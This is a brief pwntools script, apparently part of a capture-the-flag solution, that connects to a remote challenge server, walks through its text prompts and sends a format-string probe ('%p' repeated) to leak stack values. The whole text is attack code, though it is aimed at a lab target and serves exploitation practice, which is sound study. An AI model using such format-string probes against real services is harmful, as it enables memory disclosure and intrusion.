#查看sub_400BB9()栈内情况
from pwn import *
p=remote('124.126.19.106','49759')
context(arch='amd64', os='linux', log_level='debug')
p.recvuntil('secret[0] is ')
v4_addr = int(p.recvuntil('\n')[:-1], 16)
p.sendlineafter("What should your character's name be:", 'cxk')
p.sendlineafter("So, where you will go?east or up?:", 'east')
p.sendlineafter("go into there(1), or leave(0)?:", '1')
p.sendlineafter("'Give me an address'", str(int(v4_addr)))
p.sendlineafter("And, you wish is:",'AAAA'+'-%p'*10)
p.recvuntil('I hear it')
